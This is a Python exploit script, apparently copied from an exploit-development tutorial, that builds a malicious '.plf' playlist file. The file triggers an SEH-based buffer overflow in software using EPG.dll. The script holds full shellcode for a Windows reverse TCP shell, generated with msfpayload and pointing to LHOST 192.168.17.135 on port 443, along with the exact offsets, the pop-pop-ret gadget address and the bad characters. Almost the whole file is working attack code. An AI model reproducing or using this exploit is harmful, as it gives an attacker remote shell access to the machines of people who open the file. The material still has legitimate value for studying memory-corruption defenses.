#!/usr/bin/python -w
# I dont remember from where i got this but may be fuzzysecurity by b33f, credit goes to author, though i havent used this during the demo 

filename="evil.plf"
 
#---------------------------------------------------------------------------------------------------------------#
# msfpayload windows/shell_reverse_tcp LHOST=192.168.17.135 LPORT=443 R| msfencode -b '\x00\x0A\x0D\x1A' -t c #
# [*] x86/shikata_ga_nai succeeded with size 341 (iteration=1)                                                  #
#---------------------------------------------------------------------------------------------------------------#

shellcode = (
"\xdb\xc2\xbd\x90\xf9\x95\xe1\xd9\x74\x24\xf4\x58\x31\xc9\xb1"
"\x4f\x31\x68\x19\x83\xc0\x04\x03\x68\x15\x72\x0c\x69\x09\xfb"
"\xef\x92\xca\x9b\x66\x77\xfb\x89\x1d\xf3\xae\x1d\x55\x51\x43"
"\xd6\x3b\x42\xd0\x9a\x93\x65\x51\x10\xc2\x48\x62\x95\xca\x07"
"\xa0\xb4\xb6\x55\xf5\x16\x86\x95\x08\x57\xcf\xc8\xe3\x05\x98"
"\x87\x56\xb9\xad\xda\x6a\xb8\x61\x51\xd2\xc2\x04\xa6\xa7\x78"
"\x06\xf7\x18\xf7\x40\xef\x13\x5f\x71\x0e\xf7\xbc\x4d\x59\x7c"
"\x76\x25\x58\x54\x47\xc6\x6a\x98\x0b\xf9\x42\x15\x52\x3d\x64"
"\xc6\x21\x35\x96\x7b\x31\x8e\xe4\xa7\xb4\x13\x4e\x23\x6e\xf0"
"\x6e\xe0\xe8\x73\x7c\x4d\x7f\xdb\x61\x50\xac\x57\x9d\xd9\x53"
"\xb8\x17\x99\x77\x1c\x73\x79\x16\x05\xd9\x2c\x27\x55\x85\x91"
"\x8d\x1d\x24\xc5\xb7\x7f\x21\x2a\x85\x7f\xb1\x24\x9e\x0c\x83"
"\xeb\x34\x9b\xaf\x64\x92\x5c\xcf\x5e\x62\xf2\x2e\x61\x92\xda"
"\xf4\x35\xc2\x74\xdc\x35\x89\x84\xe1\xe3\x1d\xd5\x4d\x5c\xdd"
"\x85\x2d\x0c\xb5\xcf\xa1\x73\xa5\xef\x6b\x02\xe2\x78\x54\xbd"
"\xfd\xff\x3c\xbc\xfd\xfe\x07\x49\x1b\x6a\x68\x1c\xb4\x03\x11"
"\x05\x4e\xb5\xde\x93\xc6\x56\x4c\x78\x16\x10\x6d\xd7\x41\x75"
"\x43\x2e\x07\x6b\xfa\x98\x35\x76\x9a\xe3\xfd\xad\x5f\xed\xfc"
"\x20\xdb\xc9\xee\xfc\xe4\x55\x5a\x51\xb3\x03\x34\x17\x6d\xe2"
"\xee\xc1\xc2\xac\x66\x97\x28\x6f\xf0\x98\x64\x19\x1c\x28\xd1"
"\x5c\x23\x85\xb5\x68\x5c\xfb\x25\x96\xb7\xbf\x56\xdd\x95\x96"
"\xfe\xb8\x4c\xab\x62\x3b\xbb\xe8\x9a\xb8\x49\x91\x58\xa0\x38"
"\x94\x25\x66\xd1\xe4\x36\x03\xd5\x5b\x36\x06")

#----------------------------------------------------------------------------------#
# (*) badchars = '\x00\x0A\x0D\x1A'                                                #
#                                                                                  #
# offset to: (2) nseh 608-bytes, (1) seh 112-bytes                                 #
# (2) nseh = '\xEB\x06' => jump short 6-bytes                                      #
# (1) seh = 0x61617619 : pop esi # pop edi # ret  | EPG.dll                        #
# (3) shellcode space = 1384-bytes                                                 #
#----------------------------------------------------------------------------------#
# SEH Exploit Structure:                                                           #
#                                    \---------------->                            #
#     [AAA..................AAA]   [nseh]   [seh]   [BBB..................BBB]     #
#     \-------------------------------------->                                     #
#                                     <-------/                                    #
# (1) Initial EIP overwrite, SEH leads us back 4-bytes to nSEH                     #
# (2) nSEH jumps over SEH and redirects execution to our B's                       #
# (3) We place our shellcode here ... Game Over!                                   #
#----------------------------------------------------------------------------------#
 
evil = "\x90"*20 + shellcode
buffer = "A"*608 + "\xEB\x06\x90\x90" + "\x19\x76\x61\x61" + evil + "B"*(1384-len(evil))
#buffer ="A"*2000
 
textfile = open(filename , 'w')
textfile.write(buffer)
textfile.close()
